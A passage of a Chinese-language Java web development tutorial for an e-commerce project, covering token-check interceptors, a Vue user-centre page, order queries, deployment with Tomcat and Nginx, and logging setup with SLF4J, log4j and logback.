class-name">ResultVO</span> <span class="token function">userTokencheck</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> token<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>token校验拦截器配置</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterceptorConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">CheckTokenInterceptor</span> checkTokenInterceptor<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">{</span>        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span>checkTokenInterceptor<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/shopcart/**"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/orders/**"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/useraddr/**"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/user/check"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//将接口配置到token校验拦截器</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="25-1-2-前端用户中心首页校验token"><a href="#25-1-2-前端用户中心首页校验token" class="headerlink" title="25.1.2 前端用户中心首页校验token"></a>25.1.2 前端用户中心首页校验token</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> baseUrl <span class="token operator">=</span> <span class="token string">"http://localhost:8080/"</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#div1"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>            token<span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>            username<span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>            userImg<span class="token operator">:</span><span class="token string">""</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token function-variable function">created</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//从cookie中获取用户信息（token、用户id、用户名、头像）</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>token <span class="token operator">=</span> <span class="token function">getCookieValue</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>token <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"login.html?returnUrl=user-center.html"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment">//如果登录过期需要重新登录，创建一个校验用户登录的接口，通过请求这个接口进行token的检验</span>                <span class="token comment">//请求user/check接口</span>                <span class="token keyword">var</span> url1 <span class="token operator">=</span> baseUrl<span class="token operator">+</span><span class="token string">"user/check"</span><span class="token punctuation">;</span>                <span class="token function">axios</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                    url<span class="token operator">:</span>url1<span class="token punctuation">,</span>                    method<span class="token operator">:</span><span class="token string">"get"</span><span class="token punctuation">,</span>                    headers<span class="token operator">:</span><span class="token punctuation">{</span>                        token<span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>token                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token comment">//token校验通过</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>username  <span class="token operator">=</span> <span class="token function">getCookieValue</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>userImg <span class="token operator">=</span> <span class="token function">getCookieValue</span><span class="token punctuation">(</span><span class="token string">"userImg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"login.html?returnUrl=user-center.html"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="25-2-用户中心的订单管理"><a href="#25-2-用户中心的订单管理" class="headerlink" title="25.2 用户中心的订单管理"></a>25.2 用户中心的订单管理</h4><h6 id="25-2-1-流程分析"><a href="#25-2-1-流程分析" class="headerlink" title="25.2.1 流程分析"></a>25.2.1 流程分析<img src="imgs/1620699806761.png" alt="1620699806761"></h6><h6 id="25-2-2-接口实现"><a href="#25-2-2-接口实现" class="headerlink" title="25.2.2 接口实现"></a>25.2.2 接口实现</h6><ul><li><p>数据库实现</p><ul><li>根据用户的ID分页查询当前用户的订单信息、关联查询订单中的商品快照</li><li>根据用户的ID和订单状态分页查询当前用户的订单信息、关联查询订单中的商品快照</li></ul><table><thead><tr><th>封装OrdersVO</th></tr></thead><tbody><tr><td><img src="imgs/1620700246249.png" alt="1620700246249"></td></tr></tbody></table><table><thead><tr><th>OrderMapper</th></tr></thead><tbody><tr><td><img src="imgs/1620705251090.png" alt="1620705251090"></td></tr></tbody></table><table><thead><tr><th>映射配置</th></tr></thead><tbody><tr><td><img src="imgs/1620705316221.png" alt="1620705316221"></td></tr><tr><td><img src="imgs/1620705348415.png" alt="1620705348415"></td></tr><tr><td><img src="imgs/1620705432995.png" alt="1620705432995"></td></tr></tbody></table></li><li><p>Service实现</p><table><thead><tr><th>OrderServiceImpl</th></tr></thead><tbody><tr><td><img src="imgs/1620705481009.png" alt="1620705481009"></td></tr></tbody></table></li><li><p>控制器实现</p></li></ul><h6 id="25-2-3-前端实现"><a href="#25-2-3-前端实现" class="headerlink" title="25.2.3 前端实现"></a>25.2.3 前端实现</h6><p><a href="https://www.processon.com/view/link/606bde8b1e08534321fd2103">https://www.processon.com/view/link/606bde8b1e08534321fd2103</a></p><h2 id="二十六、项目云部署"><a href="#二十六、项目云部署" class="headerlink" title="二十六、项目云部署"></a>二十六、项目云部署</h2><h4 id="26-1-项目部署介绍"><a href="#26-1-项目部署介绍" class="headerlink" title="26.1 项目部署介绍"></a>26.1 项目部署介绍</h4><blockquote><p>项目部署就是将开发—测试完成的项目运行在生产环境中</p></blockquote><blockquote><p>多种的部署环境是为了实现数据的隔离、对数据进行保护</p></blockquote><p>开发环境：windows （有非常便利的可视化操作系统）</p><p>生产环境：Linux （开源免费、系统开销小、安全性高）</p><ul><li><p>开发环境（windows）</p><ul><li>应用服务器 Tomcat-windows</li><li>数据库服务器 MySQL-Linux/windows</li></ul></li><li><p>测试环境（模拟的生产环境）</p><ul><li>应用服务器 Tomcat-Linux</li><li>数据库服务器 Tomcat-Linux</li></ul></li><li><p>生产环境（需要进行保护的、不能被破坏的）</p><ul><li>应用服务器 Tomcat-Linux</li><li>数据库服务器 Tomcat-Linux</li></ul></li></ul><h4 id="26-2-后端项目部署"><a href="#26-2-后端项目部署" class="headerlink" title="26.2 后端项目部署"></a>26.2 后端项目部署</h4><h6 id="1-搭建云服务器环境"><a href="#1-搭建云服务器环境" class="headerlink" title="1.搭建云服务器环境"></a>1.搭建云服务器环境</h6><ul><li>JDK</li><li>MySQL</li></ul><h6 id="2-maven聚合工程打包"><a href="#2-maven聚合工程打包" class="headerlink" title="2.maven聚合工程打包"></a>2.maven聚合工程打包</h6><p><img src="imgs/1620955711580.png" alt="1620955711580"></p><h6 id="3-上传到云服务器"><a href="#3-上传到云服务器" class="headerlink" title="3.上传到云服务器"></a>3.上传到云服务器</h6><h6 id="4-启动项目"><a href="#4-启动项目" class="headerlink" title="4.启动项目"></a>4.启动项目</h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar api-2.0.1.jar &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="26-3-前端项目部署（tomcat）"><a href="#26-3-前端项目部署（tomcat）" class="headerlink" title="26.3 前端项目部署（tomcat）"></a>26.3 前端项目部署（tomcat）</h4><blockquote><p>前端项目也需要部署在服务器上，才能够提供多用户访问</p></blockquote><p><strong>tomcat可以作为前端项目部署的服务器使用</strong></p><ul><li><p>安装Tomcat，配置port 为 9999</p></li><li><p>将前端项目上传到tomcat/webapps中</p></li><li><p>启动Tomcat</p></li><li><p>访问：<a href="http://47.118.45.73:9999/fmall-static/index.html">http://47.118.45.73:9999/fmall-static/index.html</a></p><p><img src="imgs/1620956982397.png" alt="1620956982397"></p></li></ul><p><strong>使用Tomcat部署前端项目存在的问题：</strong></p><blockquote><p>1.前端项目的一个页面会包含大量的css\js\图片，会有大量的并发请求，Tomcat难以满足并发的需求</p><p>2.Tomcat的核心价值在于能够便于执行Java程序，而不是处理并发，同时前端项目中没有Java程序，从功能上讲前端项目的部署也用不着Tomcat</p></blockquote><p><img src="imgs/1620957666053.png" alt="1620957666053"></p><p><strong>结论</strong>：使用Tomcat作为部署前端项目的服务器是不合适的。</p><h4 id="26-4-前端项目部署（Nginx）"><a href="#26-4-前端项目部署（Nginx）" class="headerlink" title="26.4 前端项目部署（Nginx）"></a>26.4 前端项目部署（Nginx）</h4><p>在Linux安装Nginx</p><p>修改前端项目的baseUrl</p><p>将前端项目上传到nginx目录</p><p>配置nginx的访问路径</p><h2 id="二十七、项目日志管理"><a href="#二十七、项目日志管理" class="headerlink" title="二十七、项目日志管理"></a>二十七、项目日志管理</h2><h4 id="27-1-日志框架的概念"><a href="#27-1-日志框架的概念" class="headerlink" title="27.1 日志框架的概念"></a>27.1 日志框架的概念</h4><blockquote><p>在项目开发、运维过程中，为了能够清晰的知道项目在服务器中的运行过程、便于查找服务器运行过程的异常原因，我们需要对系统运行过程进行记录  —  运行日志</p><ol><li>我们可以使用 控制台输出 的形式进行运行过程记录（不便于日志信息跟踪和维护、不能够持久化存储）</li><li>控制台输出日志的诸多弊端 催化了 日志框架的诞生</li></ol></blockquote><p><strong>日志框架</strong> 用于帮助我们在应用开发中完成日志记录的帮助类</p><p><strong>日志框架作用</strong></p><p>1.有结构的记录日志信息（结构是为了提升日志信息的可读性）</p><p>2.定义日志的输出策略（每个日志文件最大5m、每天一个日志文件）</p><h4 id="27-2-日志框架规范"><a href="#27-2-日志框架规范" class="headerlink" title="27.2 日志框架规范"></a>27.2 日志框架规范</h4><blockquote><p>日志框架规范：日志记录实现的规则</p><p>日志框架：实现日志记录</p></blockquote><p><img src="imgs/1620981476178.png" alt="1620981476178"></p><ul><li><p>日志接口（日志框架规范）</p><ul><li>JCL（Jakatra Commons Logging）</li><li>SLF4J（Simple Logging Facade For Java ）</li><li>JBoss Logging</li></ul></li><li><p>日志实现（日志框架）</p><ul><li>Log4j</li><li>Logback</li></ul></li></ul><h4 id="27-3-SLF4J"><a href="#27-3-SLF4J" class="headerlink" title="27.3 SLF4J"></a>27.3 SLF4J</h4><ul><li><p>SLF4J（Simple Logging Facade For Java ）简单日志门面，定义了一套日志规范，并不是日志框架解决方法。</p></li><li><p>SLF4J的实现框架</p><p><img src="imgs/1620982360701.png" alt="1620982360701"></p></li></ul><h4 id="27-4-slf4j-simple"><a href="#27-4-slf4j-simple" class="headerlink" title="27.4 slf4j-simple"></a>27.4 slf4j-simple</h4><ul><li><p>创建springBoot应用</p></li><li><p>移出springboot应用默认logback-classic的日志依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>ch.qos.logback<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>logback-classic<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>添加依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/slf4j-simple --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>slf4j-simple<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.7.25<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在service层打印日志</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">TestService</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestServiceImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//日志记录</span>        <span class="token comment">//System.out.println("日志信息");</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"订单添加完成"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="27-5-log4j使用介绍"><a href="#27-5-log4j使用介绍" class="headerlink" title="27.5 log4j使用介绍"></a>27.5 log4j使用介绍</h4><blockquote><p>log4j没有实现slf4j,如果基于slf4j规范使用log4j，则需要添加slf4j-log4j12依赖</p></blockquote><ul><li><p>添加依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>slf4j-log4j12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.7.25<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="imgs/1620984673915.png" alt="1620984673915"></p></li><li><p>在resources目录下创建log4j.properties文件</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">log4j.rootLogger</span><span class="token punctuation">=</span><span class="token attr-value">DEBUG,stdout</span><span class="token comment"># MyBatis logging configuration...</span><span class="token attr-name">log4j.logger.org.mybatis.example.BlogMapper</span><span class="token punctuation">=</span><span class="token attr-value">TRACE</span><span class="token comment"># Console output...</span><span class="token attr-name">log4j.appender.stdout</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.ConsoleAppender</span><span class="token attr-name">log4j.appender.stdout.layout</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.PatternLayout</span><span class="token attr-name">log4j.appender.stdout.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token attr-value">[%t] %5p - %n%m</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="27-6-基于SpringBoot应用的logback日志配置"><a href="#27-6-基于SpringBoot应用的logback日志配置" class="headerlink" title="27.6 基于SpringBoot应用的logback日志配置"></a>27.6 基于SpringBoot应用的logback日志配置</h4><blockquote><p>SpringBoot默认整合了logback-classic日志框架，我们需要对logback日志框架进行配置以自定义日志输出格式、日志文件配置、日志文件保存策略等信息</p></blockquote><ul><li>logback配置</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stdout<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>springProfile</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dev<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>springProfile</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>springProfile</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>!dev<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>springProfile</span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!--日志的编码格式--&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charset</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>charset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--这个就表示的是要把 日志输出到文件(FileAppender)--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.FileAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">&gt;</span></span>D:/log/output.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--设置日志是否追加--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>append</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>append</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss.SSS} %level[%thread]-%class:%line&gt;&gt;%msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charset</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>charset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--设置日志写入是否线程安全--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prudent</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prudent</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timeFile<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--TimeBasedRollingPolicy  基于时间的滚动策略--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rollingPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.TimeBasedRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>d:/log/log-%d{yyyy-MM-dd-HH}.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd-HH:mm:ss.SSS} %level[%thread]-%class:%line&gt;&gt;%msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charset</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>charset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fixedFile<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">&gt;</span></span>d:/log/fixedFile.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token 